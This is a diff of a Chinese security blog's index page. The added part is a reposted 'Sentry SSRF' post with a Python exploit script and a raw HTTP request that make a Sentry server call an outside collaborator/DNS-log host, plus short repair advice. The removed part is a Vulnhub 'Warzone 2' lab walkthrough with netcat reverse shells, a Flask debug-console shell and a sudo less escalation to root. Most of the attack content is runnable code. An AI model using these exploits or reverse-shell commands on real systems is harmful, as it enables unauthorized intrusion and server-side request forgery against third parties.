@@ -86,6 +86,57 @@
 
     
         <h2 class="title">
+            <a href="/2024/01/19/Sentry-SSRF/">
+                Sentry SSRF
+            </a>
+        </h2>
+    
+    <time>
+        Jan 19, 2024
+    </time>
+    <section class="content">
+        <h1><span id="sentry-ssrf">Sentry SSRF</span></h1><blockquote>
+<p>本文转自<a target="_blank" rel="noopener" href="https://www.cnblogs.com/mysticbinary/p/12979368.html">Mysticbinary</a> 并作补充</p>
+</blockquote>
+<h2><span id="what-is-sentry">What is Sentry</span></h2><blockquote>
+<p>Sentry 是一个实时的事件日志和聚合平台，基于 Django 构建。一般在url上、或者logo上看到有sentry都可以用它的exp试试，原理是由于sentry默认开启source code scrapping ，导致可以从外部进行blind ssrf请求。</p>
+</blockquote>
+<h2><span id="exp-testing">exp testing</span></h2><blockquote>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">(python3) ➜  sentrySSRF git:(master) python sentrySSRF.py -i http://【your target url】 -d</span><br><span class="line">Found Sentry: https://ef00ffc3xxxxxe5b60afff8c138c77e@【your target url】/1</span><br><span class="line">Enter your burpcollaborator address:【your dnslog】</span><br></pre></td></tr></table></figure>
+
+<p>然后去你到dnslog看看有没有请求记录即可。</p>
+<p>exp源码参考：<br>配置如下：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    s = <span class="string">&quot;https://a8d729459beb446eb3cbb9df997dcc7b@sentry.mindworks.xyz/1&quot;</span></span><br><span class="line">    collaborator = <span class="string">&quot;dp6sk5k006h6dcq3bdu6e6a9t0zqnf.burpcollaborator.net&quot;</span></span><br><span class="line">    key = re.search(<span class="string">&#x27;https://(.*)@&#x27;</span>, s)</span><br><span class="line">    domain = re.search(<span class="string">&#x27;@(.*)/&#x27;</span>, s)</span><br><span class="line">    number = re.search(<span class="string">&#x27;/(.*)&#x27;</span>, s[<span class="number">8</span>:])</span><br><span class="line">    url = <span class="string">&quot;https://&quot;</span> + domain.group(<span class="number">1</span>) + <span class="string">&quot;/api/&quot;</span> + number.group(<span class="number">1</span>) + <span class="string">&quot;/store/?sentry_key=&quot;</span> + key.group(<span class="number">1</span>) + <span class="string">&quot;&amp;sentry_version=7&quot;</span></span><br><span class="line">    <span class="built_in">print</span>(url)</span><br><span class="line">    datas = &#123;<span class="string">&quot;extra&quot;</span>:&#123;<span class="string">&quot;component&quot;</span>:<span class="string">&quot;redux/actions/index&quot;</span>,<span class="string">&quot;action&quot;</span>:<span class="string">&quot;RegisterDeviceWeb&quot;</span>,<span class="string">&quot;serialized&quot;</span>:&#123;<span class="string">&quot;code&quot;</span>:<span class="string">&quot;INVALID_CREDENTIALS&quot;</span>,<span class="string">&quot;details&quot;</span>:[]&#125;&#125;,<span class="string">&quot;fingerprint&quot;</span>:[<span class="string">&quot;3cbf661c7f723b0a5816c16968fd9493&quot;</span>,<span class="string">&quot;Non-Error exception captured with keys: code, details, message&quot;</span>],<span class="string">&quot;message&quot;</span>:<span class="string">&quot;Non-Error exception captured with keys: code, details, message&quot;</span>,<span class="string">&quot;stacktrace&quot;</span>:&#123;<span class="string">&quot;frames&quot;</span>:[&#123;<span class="string">&quot;colno&quot;</span>:<span class="number">218121</span>,<span class="string">&quot;filename&quot;</span>:<span class="string">&quot;http://&quot;</span>+collaborator,<span class="string">&quot;function&quot;</span>:<span class="string">&quot;?&quot;</span>,<span class="string">&quot;lineno&quot;</span>:<span class="number">1</span>&#125;]&#125;,<span class="string">&quot;exception&quot;</span>:&#123;<span class="string">&quot;values&quot;</span>:[&#123;<span class="string">&quot;value&quot;</span>:<span class="string">&quot;Custom Object&quot;</span>,<span class="string">&quot;type&quot;</span>:<span class="string">&quot;Error&quot;</span>&#125;]&#125;,<span class="string">&quot;event_id&quot;</span>:<span class="string">&quot;d0513ec5a3544e05aef0d1c7c5b24bae&quot;</span>,<span class="string">&quot;platform&quot;</span>:<span class="string">&quot;javascript&quot;</span>,<span class="string">&quot;sdk&quot;</span>:&#123;<span class="string">&quot;name&quot;</span>:<span class="string">&quot;sentry.javascript.browser&quot;</span>,<span class="string">&quot;packages&quot;</span>:[&#123;<span class="string">&quot;name&quot;</span>:<span class="string">&quot;npm:@sentry/browser&quot;</span>,<span class="string">&quot;version&quot;</span>:<span class="string">&quot;4.6.4&quot;</span>&#125;],<span class="string">&quot;version&quot;</span>:<span class="string">&quot;4.6.4&quot;</span>&#125;,<span class="string">&quot;release&quot;</span>:<span class="string">&quot;6225dd99&quot;</span>,<span class="string">&quot;user&quot;</span>:&#123;<span class="string">&quot;phash&quot;</span>:<span class="string">&quot;996a3f4661e02cb505ae0daf406555e9b914f9d43d635c52cfc7485046862a7f&quot;</span>&#125;,<span class="string">&quot;breadcrumbs&quot;</span>:[&#123;<span class="string">&quot;timestamp&quot;</span>:<span class="number">1554226659.455</span>,<span class="string">&quot;category&quot;</span>:<span class="string">&quot;navigation&quot;</span>,<span class="string">&quot;data&quot;</span>:&#123;<span class="string">&quot;from&quot;</span>:<span class="string">&quot;/&quot;</span>,<span class="string">&quot;to&quot;</span>:<span class="string">&quot;/login&quot;</span>&#125;&#125;]&#125;</span><br><span class="line">    headers = &#123;<span class="string">&#x27;Content-type&#x27;</span>: <span class="string">&#x27;application/json&#x27;</span>, <span class="string">&#x27;Origin&#x27;</span>:<span class="string">&#x27;https://z.tochka.com/&#x27;</span>&#125;</span><br><span class="line">    rsp = requests.post(url, json=datas, headers=headers)</span><br></pre></td></tr></table></figure>
+</blockquote>
+<h2><span id="to-build-blind-http-pack">To Build blind http pack</span></h2><blockquote>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/api/1/store/?sentry_version=7&amp;sentry_client=raven-js%2f3.15.0&amp;sentry_key=【your</span> key】 <span class="string">HTTP/1.1</span></span><br><span class="line"><span class="string">Host:</span> 【your <span class="string">target</span> url】.com</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span><span class="punctuation">: </span>1</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.97 Safari/537.36</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>zh-CN,zh;q=0.9</span><br><span class="line"><span class="attribute">Content-type</span><span class="punctuation">: </span>application/json</span><br><span class="line">Origin:【随意domain】</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>329</span><br><span class="line"></span><br><span class="line"><span class="language-smalltalk">&#123;<span class="comment">&quot;project&quot;</span>:<span class="comment">&quot;30&quot;</span>,<span class="comment">&quot;logger&quot;</span>:<span class="comment">&quot;javascript&quot;</span>,<span class="comment">&quot;platform&quot;</span>:<span class="comment">&quot;javascript&quot;</span>,<span class="comment">&quot;exception&quot;</span>:&#123;<span class="comment">&quot;values&quot;</span>:[&#123;<span class="comment">&quot;type&quot;</span>:<span class="comment">&quot;Error&quot;</span>,<span class="comment">&quot;value&quot;</span>:<span class="comment">&quot;Trying to get control scope but angular isn&#x27;t ready yet or something like this&quot;</span>,<span class="comment">&quot;stacktrace&quot;</span>:&#123;<span class="comment">&quot;frames&quot;</span>:[&#123;<span class="comment">&quot;filename&quot;</span>:<span class="comment">&quot;http://【your dnslog】&quot;</span>,<span class="comment">&quot;lineno&quot;</span>:<span class="number">110</span>,<span class="comment">&quot;colno&quot;</span>:<span class="number">81071</span>,<span class="comment">&quot;function&quot;</span>:<span class="comment">&quot;XMLHttpRequest.o&quot;</span>,<span class="comment">&quot;in_app&quot;</span>:<span class="keyword">true</span>&#125;]&#125;&#125;]&#125;&#125;</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/2024/01/19/Sentry-SSRF/1.png" alt="image"></p>
+<p>sentry_version &#x3D; 红线2 （报错可以手动修改几个其他版本试试）<br>sentry_key &#x3D; Raven.config 红线1<br>origin &#x3D; 可以随便写</p>
+</blockquote>
+<h2><span id="repair">Repair</span></h2><blockquote>
+<p>1、sentry关闭 source code scrapping；<br>2、保证配置文件中的黑名单不为空：&#x2F;sentry&#x2F;conf&#x2F;server.py</p>
+</blockquote>
+<h2><span id="reference">Reference</span></h2><blockquote>
+<p><a target="_blank" rel="noopener" href="https://hackerone.com/reports/374737">https://hackerone.com/reports/374737</a><br><a target="_blank" rel="noopener" href="https://github.com/xawdxawdx/sentrySSRF">https://github.com/xawdxawdx/sentrySSRF</a></p>
+</blockquote>
+
+
+        
+
+        
+            <div class="tags">
+                <a class="tag-none-link" href="/tags/Exploit/" rel="tag">Exploit</a><a class="tag-none-link" href="/tags/RCE/" rel="tag">RCE</a><a class="tag-none-link" href="/tags/Reprint/" rel="tag">Reprint</a><a class="tag-none-link" href="/tags/SSRF/" rel="tag">SSRF</a><a class="tag-none-link" href="/tags/Sentry/" rel="tag">Sentry</a>
+            </div>
+        
+
+    </section>
+</article>
+  
+    <article class="post ">
+
+    
+        <h2 class="title">
             <a href="/2024/01/19/CVE-2020-11110-Grafana/">
                 Grafana 存储型XSS漏洞（CVE-2020-11110）
             </a>
@@ -917,106 +968,6 @@
 <p>3.随意传递参数输入，可以得到root的密码为ufo_phosXEN，现在可以提权到root，并且在&#x2F;root目录下发现第二个flag，boss.txt：</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">su root</span><br><span class="line">cd /root</span><br><span class="line">ls -la</span><br><span class="line">cat boss.txt</span><br></pre></td></tr></table></figure>
 <p><img src="/2023/12/11/Warzone-3/16.png" alt="image"></p>
-</blockquote>
-
-
-        
-
-        
-            <div class="tags">
-                <a class="tag-none-link" href="/tags/Vulnhub/" rel="tag">Vulnhub</a><a class="tag-none-link" href="/tags/Warzone/" rel="tag">Warzone</a><a class="tag-none-link" href="/tags/WriteUp/" rel="tag">WriteUp</a>
-            </div>
-        
-
-    </section>
-</article>
-  
-    <article class="post ">
-
-    
-        <h2 class="title">
-            <a href="/2023/12/11/Warzone-2/">
-                WARZONE 2
-            </a>
-        </h2>
-    
-    <time>
-        Dec 11, 2023
-    </time>
-    <section class="content">
-        <h1><span id="warzone-2">WARZONE: 2</span></h1><h2><span id="一-基本信息">一、基本信息</span></h2><blockquote>
-<h4><span id="名称warzone-2">名称：Warzone: 2</span></h4><h4><span id="发布日期2020119">发布日期：2020.11.9</span></h4><h4><span id="作者al1enum">作者：AL1ENUM</span></h4><h4><span id="系列warzone">系列：Warzone</span></h4><h4><span id="推特-al1enum">推特: @AL1ENUM</span></h4></blockquote>
-<h2><span id="二-靶机简介">二、靶机简介</span></h2><blockquote>
-<h4><span id="flags">Flags：</span></h4><p>admiral:&#x2F;~&#x2F;Desktop&#x2F;silver.txt<br>root:&#x2F;root&#x2F;Desktop&#x2F;gold.txt </p>
-<h4><span id="难度中等">难度：中等</span></h4></blockquote>
-<h2><span id="三-文件信息">三、文件信息</span></h2><blockquote>
-<h4><span id="文件名warzone2ova">文件名：Warzone2.ova</span></h4><h4><span id="文件大小26gb">文件大小：2.6GB</span></h4><h4><span id="下载地址httpsdownloadvulnhubcomwarzonewarzone2ova">下载地址：</span></h4><h4><span id="md5-ff639b25fb64a049e094fc20f51b732c">MD5: FF639B25FB64A049E094FC20F51B732C</span></h4><h4><span id="sha1-e5b5cadf476129cc365edf58c5855497b97f1aa5">SHA1: E5B5CADF476129CC365EDF58C5855497B97F1AA5</span></h4></blockquote>
-<h2><span id="四-镜像信息">四、镜像信息</span></h2><blockquote>
-<h4><span id="格式virtual-machine-virtualbox-ova">格式：Virtual Machine (Virtualbox - OVA)</span></h4><h4><span id="操作系统linuxdebain">操作系统：Linux(debain)</span></h4></blockquote>
-<h2><span id="五-网络信息">五、网络信息</span></h2><blockquote>
-<h4><span id="dhcp服务可用">DHCP服务：可用</span></h4><h4><span id="ip地址自动分配">IP地址：自动分配</span></h4></blockquote>
-<h2><span id="六-环境配置">六、环境配置</span></h2><blockquote>
-<p>1.将靶机warzone2和攻击机kali2021在VirtualBox下设置为仅主机模式，使用DHCP分配ip地址：</p>
-<p><img src="/2023/12/11/Warzone-2/1.png" alt="image"></p>
-</blockquote>
-<h2><span id="七-攻略步骤">七、攻略步骤</span></h2><h3><span id="信息探测">信息探测</span></h3><blockquote>
-<p>1.因为是没有直接告知我们靶机ip的，所以要先进行主机探测，先查看下kali分配到的ip，在进行网段扫描，命令如下，得到靶机ip为192.168.56.102：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&gt;ifconfig，查看kali分配到的ip</span><br></pre></td></tr></table></figure>
-<p><img src="/2023/12/11/Warzone-2/2.png" alt="image"></p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&gt;nmap -sP 192.168.56.0/24，扫描靶机ip</span><br></pre></td></tr></table></figure>
-<p><img src="/2023/12/11/Warzone-2/3.png" alt="image"></p>
-<p>2.再进行端口扫描，发现开放了21，22和1337端口，都是无法网页访问的：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&gt;nmap -T4 -sC -sV -p- --min-rate=1000 192.168.56.129 | tee nmapscan，端口扫描</span><br></pre></td></tr></table></figure>
-<p><img src="/2023/12/11/Warzone-2/4.png" alt="image"></p>
-</blockquote>
-<h3><span id="ftp匿名登录">FTP匿名登录</span></h3><blockquote>
-<p>1.来到21端口，我们发现ftp服务可匿名登录：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ftp 192.168.56.129</span><br><span class="line">anonymous</span><br></pre></td></tr></table></figure>
-<p><img src="/2023/12/11/Warzone-2/5.png" alt="image"></p>
-<p>2.在&#x2F;anon目录下我们能发现username.PNG，password.PNG及token.PNG，全部获取到kali查看一下：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">cd anon</span><br><span class="line">ls -la</span><br><span class="line">get username.PNG</span><br><span class="line">get password.PNG</span><br><span class="line">get token.PNG</span><br><span class="line">quit</span><br></pre></td></tr></table></figure>
-<p><img src="/2023/12/11/Warzone-2/6.png" alt="image"></p>
-<p><img src="/2023/12/11/Warzone-2/7.png" alt="image"></p>
-<p><img src="/2023/12/11/Warzone-2/8.png" alt="image"></p>
-<p><img src="/2023/12/11/Warzone-2/9.png" alt="image"></p>
-<p>3.在网络上查询旗语的指代，可以得到用户名为semaphore，密码为signalperson，然后进行sha256加密再转hex后得到token为833ad488464de1a27d512f104b639258e77901f14eab706163063d34054a7b26，可以远程链接1337端口：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc 192.168.56.129 1337</span><br></pre></td></tr></table></figure>
-<p><img src="/2023/12/11/Warzone-2/10.png" alt="image"></p>
-<p>4.可以在kali开启对应的端口监听，获取shell：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">nc -e /bin/bash 192.168.56.102 1234，靶机返回shell</span><br><span class="line"></span><br><span class="line">nc -lvnp 1234，kali开启监听</span><br></pre></td></tr></table></figure>
-<p><img src="/2023/12/11/Warzone-2/11.png" alt="image"></p>
-</blockquote>
-<h3><span id="初步提权">初步提权</span></h3><blockquote>
-<p>1.在&#x2F;flagman目录下我们能发现一个warzone2-socket-server目录，在其中的.mysshpassword文件可以发现flagman的ssh登录密码，可以登录到flagman：</p>
-<p><img src="/2023/12/11/Warzone-2/12.png" alt="image"></p>
-<p><img src="/2023/12/11/Warzone-2/13.png" alt="image"></p>
-<p>2.在flagman用户下利用sudo -l命令能发现admiral用户能够执行wrz2-app.py，而flagman无权读写该文件：</p>
-<p><img src="/2023/12/11/Warzone-2/14.png" alt="image"></p>
-<p>3.运行wrz2-app.py发现程序在5000端口起了一个flask，并且开启了debug和输出了pin码：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo -u admiral /usr/bin/python3 /home/admiral/warzone2-app/wrz2-app.py</span><br></pre></td></tr></table></figure>
-<p><img src="/2023/12/11/Warzone-2/15.png" alt="image"></p>
-<p>4.那么我们就要尝试在debug中获取反弹shell，获取用户admiral权限。由于监听在地址127.0.0.1，这里使用socat做了一个端口转发：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">socat TCP4-LISTEN:15000,reuseaddr,fork TCP4:127.0.0.1:5000</span><br><span class="line"></span><br><span class="line">sudo -u admiral /usr/bin/python3 /home/admiral/warzone2-app/wrz2-app.py，再开启一个窗口链接flagman执行wrz2-app.py</span><br></pre></td></tr></table></figure>
-<p><img src="/2023/12/11/Warzone-2/16.png" alt="image"></p>
-<p>5.访问192.168.56.129:15000&#x2F;console，输入wrz2-app.py生成的PIN，构造shell，在kali开启对应端口监听，成功反弹：</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line">os.system(<span class="string">&#x27;nc -e /bin/bash 192.168.56.102 9002&#x27;</span>)</span><br><span class="line"></span><br><span class="line">nc -lvnp <span class="number">9002</span></span><br></pre></td></tr></table></figure>
-<p><img src="/2023/12/11/Warzone-2/17.png" alt="image"></p>
-<p><img src="/2023/12/11/Warzone-2/18.png" alt="image"></p>
-<p>6.在&#x2F;home&#x2F;admiral&#x2F;Desktop目录下，我们能获得第一个flag，silver.txt：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">cd ~/Desktop</span><br><span class="line">ls -la</span><br><span class="line">cat silver.txt</span><br></pre></td></tr></table></figure>
-<p><img src="/2023/12/11/Warzone-2/19.png" alt="image"></p>
-</blockquote>
-<h3><span id="root提权">root提权</span></h3><blockquote>
-<p>1.再通过sudo -l命令，可以看到less可以执行特权命令：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo -l</span><br></pre></td></tr></table></figure>
-<p><img src="/2023/12/11/Warzone-2/20.png" alt="image"></p>
-<p>2.那我们可以直接使用less进行提权：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo -u root /usr/bin/less /var/public/warzone-rules.txt</span><br><span class="line">:!id，在warzone-rules.txt编辑页输入</span><br></pre></td></tr></table></figure>
-<p><img src="/2023/12/11/Warzone-2/21.png" alt="image"></p>
-<p><img src="/2023/12/11/Warzone-2/22.png" alt="image"></p>
-<p>3.成功提权到root，并可以在&#x2F;root&#x2F;Desktop下发现第二个flag，gold.txt：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo -u root /usr/bin/less /var/public/warzone-rules.txt</span><br><span class="line">cat /root/Desktop/gold.txt</span><br></pre></td></tr></table></figure>
-<p><img src="/2023/12/11/Warzone-2/23.png" alt="image"></p>
 </blockquote>
 
 
